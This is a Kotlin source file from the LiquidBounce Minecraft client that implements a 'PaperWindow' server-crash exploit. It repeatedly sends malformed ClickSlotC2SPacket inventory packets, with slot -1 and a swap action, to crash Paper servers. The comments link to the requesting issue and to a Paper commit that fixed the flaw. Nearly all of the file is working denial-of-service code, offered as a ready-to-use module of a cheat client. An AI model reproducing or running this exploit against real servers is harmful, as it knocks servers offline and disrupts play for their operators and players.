/*
 * This file is part of LiquidBounce (https://github.com/CCBlueX/LiquidBounce)
 *
 * Copyright (c) 2015 - 2024 CCBlueX
 *
 * LiquidBounce is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * LiquidBounce is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with LiquidBounce. If not, see <https://www.gnu.org/licenses/>.
 *
 */
package net.ccbluex.liquidbounce.features.module.modules.exploit.servercrasher.exploits

import it.unimi.dsi.fastutil.ints.Int2ObjectMaps
import net.ccbluex.liquidbounce.config.Choice
import net.ccbluex.liquidbounce.config.ChoiceConfigurable
import net.ccbluex.liquidbounce.event.repeatable
import net.ccbluex.liquidbounce.features.module.modules.exploit.servercrasher.ModuleServerCrasher
import net.minecraft.item.ItemStack
import net.minecraft.item.Items
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket
import net.minecraft.screen.slot.SlotActionType

/**
 * PaperWindow exploit
 *
 * Requested from https://github.com/CCBlueX/LiquidBounce/issues/2113
 * Original PR by https://github.com/AntiCope/meteor-crash-addon/pull/24
 * Copy PR https://github.com/CCBlueX/LiquidBounce/pull/2189
 *
 * Issue fixed by https://github.com/PaperMC/Paper/commit/8493340be4fa69fa9369719272e5dff1b7a2f455
 */
object PaperWindowExploit : Choice("PaperWindow") {

    override val parent: ChoiceConfigurable<Choice>
        get() = ModuleServerCrasher.exploitChoices

    /**
     * The amount of packets to send
     */
    private val packets by int("Packets", 6, 2..12)

    val repeatable = repeatable {
        val handler = player.currentScreenHandler
        val packet = ClickSlotC2SPacket(
            handler.syncId,
            handler.revision,
            36,
            -1,
            SlotActionType.SWAP,
            handler.cursorStack.copy(),
            Int2ObjectMaps.singleton(0, ItemStack(Items.GOLDEN_CARROT,1))
        )

        repeat(packets) {
            network.sendPacket(packet)
        }
        waitTicks(1)
    }

}
